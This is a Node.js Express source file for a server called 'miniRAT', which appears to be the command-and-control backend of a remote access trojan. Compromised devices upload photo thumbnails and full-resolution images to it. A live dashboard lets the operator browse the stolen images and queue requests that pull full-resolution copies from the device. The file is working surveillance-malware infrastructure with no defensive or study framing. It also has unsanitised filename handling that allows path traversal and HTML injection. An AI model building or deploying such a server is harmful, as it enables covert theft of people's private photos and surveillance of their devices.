const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 5000;

// ─── Middleware ─────────────────────────────────────────────────────

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

// ─── Directories ────────────────────────────────────────────────────

const uploadDir = './uploads';
const fullResDir = './full_res';

if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
if (!fs.existsSync(fullResDir)) fs.mkdirSync(fullResDir, { recursive: true });

app.use('/uploads', express.static(uploadDir));
app.use('/full_res', express.static(fullResDir));

// ─── Request queue (in-memory + file persistence) ───────────────────

const requestsFile = path.join(uploadDir, 'requests.json');
let pendingRequests = [];

if (fs.existsSync(requestsFile)) {
    try {
        pendingRequests = JSON.parse(fs.readFileSync(requestsFile, 'utf8'));
    } catch (e) {
        pendingRequests = [];
    }
}

function saveRequests() {
    fs.writeFileSync(requestsFile, JSON.stringify(pendingRequests, null, 2));
}

// ─── API: Thumbnail upload ──────────────────────────────────────────

app.post('/api/upload/thumbnail', (req, res) => {
    try {
        const { filename, thumbnail } = req.body;
        const thumbnailData = thumbnail.split(',')[1] || thumbnail;
        const buffer = Buffer.from(thumbnailData, 'base64');

        const thumbPath = path.join(uploadDir, filename + '_thumb.jpg');
        fs.writeFileSync(thumbPath, buffer);

        const metaPath = path.join(uploadDir, filename + '.metadata.json');
        fs.writeFileSync(metaPath, JSON.stringify({
            originalName: filename,
            thumbnailPath: filename + '_thumb.jpg',
            uploadedAt: new Date().toISOString()
        }, null, 2));

        console.log('📸 Thumbnail received:', filename);
        res.json({ success: true, filename });
    } catch (error) {
        console.error('Error uploading thumbnail:', error);
        res.status(500).json({ success: false, error: 'Failed to upload thumbnail' });
    }
});

// ─── API: Full-res image upload ─────────────────────────────────────

app.post('/api/upload/fullsize', (req, res) => {
    try {
        const { filename, image } = req.body;
        const imageData = image.split(',')[1] || image;
        const buffer = Buffer.from(imageData, 'base64');

        const fullPath = path.join(fullResDir, filename);
        fs.writeFileSync(fullPath, buffer);

        console.log('🖼️  Full-res saved to ./full_res/' + filename + ' (' + Math.round(buffer.length / 1024) + ' KB)');
        res.json({ success: true, filename });
    } catch (error) {
        console.error('Error uploading full image:', error);
        res.status(500).json({ success: false, error: 'Failed to upload full image' });
    }
});

// ─── API: Thumbnail listing ─────────────────────────────────────────

app.get('/api/thumbnails', (req, res) => {
    try {
        const files = fs.readdirSync(uploadDir);
        const thumbnails = [];

        files.forEach(file => {
            if (file.endsWith('_thumb.jpg')) {
                const metaFile = file.replace('_thumb.jpg', '.metadata.json');
                let metadata = { originalName: file.replace('_thumb.jpg', '') };

                try {
                    metadata = JSON.parse(
                        fs.readFileSync(path.join(uploadDir, metaFile), 'utf8'));
                } catch (e) {}

                const hasFullRes = fs.existsSync(
                    path.join(fullResDir, metadata.originalName));
                const isPending = pendingRequests.includes(metadata.originalName);

                thumbnails.push({
                    name: metadata.originalName,
                    thumbnail: file,
                    uploadedAt: metadata.uploadedAt,
                    hasFullRes,
                    isPending
                });
            }
        });

        thumbnails.sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt));
        res.json({ thumbnails });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Failed to fetch thumbnails' });
    }
});

// ─── API: Request queue ─────────────────────────────────────────────

app.get('/api/requests', (req, res) => {
    res.json({ requests: pendingRequests });
});

app.post('/api/request/:filename', (req, res) => {
    const filename = decodeURIComponent(req.params.filename);
    if (!pendingRequests.includes(filename)) {
        pendingRequests.push(filename);
        saveRequests();
        console.log('📋 Full-res requested:', filename);
    }
    res.json({ success: true, pending: pendingRequests.length });
});

app.delete('/api/request/:filename', (req, res) => {
    const filename = decodeURIComponent(req.params.filename);
    pendingRequests = pendingRequests.filter(f => f !== filename);
    saveRequests();
    res.json({ success: true });
});

// ─── Dashboard ──────────────────────────────────────────────────────

app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head>
    <title>miniRAT — Live Gallery</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #0a0a0a; color: #e0e0e0;
            min-height: 100vh;
        }
        .header {
            padding: 20px 30px;
            border-bottom: 1px solid #222;
            display: flex; align-items: center; justify-content: space-between;
        }
        .header h1 { font-size: 20px; font-weight: 600; }
        .header h1 span { color: #666; font-weight: 400; }
        .status {
            display: flex; align-items: center; gap: 8px;
            font-size: 13px; color: #888;
        }
        .live-dot {
            width: 8px; height: 8px; border-radius: 50%;
            background: #22c55e;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        .stats {
            padding: 12px 30px;
            font-size: 13px; color: #666;
            border-bottom: 1px solid #1a1a1a;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
            gap: 4px; padding: 4px;
        }
        .thumb {
            position: relative; aspect-ratio: 1;
            overflow: hidden; cursor: pointer;
            animation: fadeIn 0.4s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }
        .thumb img {
            width: 100%; height: 100%;
            object-fit: cover; display: block;
            transition: transform 0.2s;
        }
        .thumb:hover img { transform: scale(1.05); }
        .thumb .overlay {
            position: absolute; bottom: 0; left: 0; right: 0;
            padding: 30px 8px 8px;
            background: linear-gradient(transparent, rgba(0,0,0,0.9));
            opacity: 0; transition: opacity 0.2s;
            display: flex; flex-direction: column; gap: 4px;
        }
        .thumb:hover .overlay { opacity: 1; }
        .thumb .name {
            font-size: 11px; white-space: nowrap;
            overflow: hidden; text-overflow: ellipsis;
        }
        .btn {
            padding: 4px 8px; border: none; border-radius: 3px;
            font-size: 10px; cursor: pointer; font-weight: 600;
            transition: background 0.2s; text-align: center;
        }
        .btn-request {
            background: #2563eb; color: white;
        }
        .btn-request:hover { background: #1d4ed8; }
        .btn-pending {
            background: #854d0e; color: #fbbf24;
            cursor: wait;
        }
        .btn-saved {
            background: #15803d; color: #86efac;
            cursor: default;
        }
        .empty {
            grid-column: 1 / -1;
            text-align: center; padding: 80px 20px;
            color: #444; font-size: 15px;
        }
        .empty .icon { font-size: 48px; margin-bottom: 12px; }
        .toast {
            position: fixed; bottom: 20px; right: 20px;
            background: #1e293b; color: #e0e0e0;
            padding: 10px 16px; border-radius: 6px;
            font-size: 13px; opacity: 0; transition: opacity 0.3s;
            pointer-events: none;
        }
        .toast.show { opacity: 1; }
    </style>
</head>
<body>
    <div class="header">
        <h1>miniRAT <span>Gallery</span></h1>
        <div class="status">
            <div class="live-dot"></div>
            <span>Live — refreshing every 3s</span>
        </div>
    </div>
    <div class="stats" id="stats">Loading...</div>
    <div id="gallery" class="gallery"></div>
    <div id="toast" class="toast"></div>

    <script>
        let lastHash = '';

        function showToast(msg) {
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.classList.add('show');
            setTimeout(() => t.classList.remove('show'), 2000);
        }

        async function requestFullRes(filename) {
            try {
                await fetch('/api/request/' + encodeURIComponent(filename), { method: 'POST' });
                showToast('Requested full-res: ' + filename);
                lastHash = '';
                loadThumbnails();
            } catch (e) {
                showToast('Request failed');
            }
        }

        async function loadThumbnails() {
            try {
                const response = await fetch('/api/thumbnails');
                const data = await response.json();
                const gallery = document.getElementById('gallery');
                const stats = document.getElementById('stats');

                if (data.thumbnails && data.thumbnails.length > 0) {
                    const count = data.thumbnails.length;
                    const latest = data.thumbnails[0];
                    const latestTime = latest.uploadedAt
                        ? new Date(latest.uploadedAt).toLocaleString()
                        : 'unknown';
                    const saved = data.thumbnails.filter(t => t.hasFullRes).length;
                    const pending = data.thumbnails.filter(t => t.isPending).length;

                    let statusText = count + ' thumbnails';
                    if (saved > 0) statusText += ' · ' + saved + ' full-res saved';
                    if (pending > 0) statusText += ' · ' + pending + ' pending';
                    statusText += ' — latest: ' + latestTime;
                    stats.textContent = statusText;

                    const newHash = data.thumbnails.map(t =>
                        t.name + t.hasFullRes + t.isPending).join('|');

                    if (newHash !== lastHash) {
                        gallery.innerHTML = '';
                        data.thumbnails.forEach(function(thumb) {
                            const div = document.createElement('div');
                            div.className = 'thumb';

                            let actionBtn = '';
                            if (thumb.hasFullRes) {
                                actionBtn = '<span class="btn btn-saved">✓ Saved to full_res</span>';
                            } else if (thumb.isPending) {
                                actionBtn = '<span class="btn btn-pending">⏳ Waiting for device</span>';
                            } else {
                                actionBtn = '<button class="btn btn-request" onclick="event.stopPropagation();requestFullRes(\\'' +
                                    thumb.name.replace(/'/g, "\\\\'") +
                                    '\\')">📥 Get Full Res</button>';
                            }

                            div.innerHTML =
                                '<img src="/uploads/' + thumb.thumbnail + '" alt="' + thumb.name + '">' +
                                '<div class="overlay">' +
                                '<div class="name">' + thumb.name + '</div>' +
                                actionBtn +
                                '</div>';
                            gallery.appendChild(div);
                        });
                        lastHash = newHash;
                    }
                } else {
                    stats.textContent = '0 images — waiting for uploads...';
                    gallery.innerHTML =
                        '<div class="empty">' +
                        '<div class="icon">📡</div>' +
                        'Waiting for incoming thumbnails...' +
                        '</div>';
                }
            } catch (error) {
                document.getElementById('stats').textContent = 'Connection error — retrying...';
            }
        }

        loadThumbnails();
        setInterval(loadThumbnails, 3000);
    </script>
</body>
</html>`);
});

// ─── Server startup ─────────────────────────────────────────────────

app.listen(port, '0.0.0.0', () => {
    console.log('🐀 RAT server running at http://localhost:' + port);
});

process.on('SIGINT', () => {
    console.log('Shutting down server...');
    process.exit(0);
});
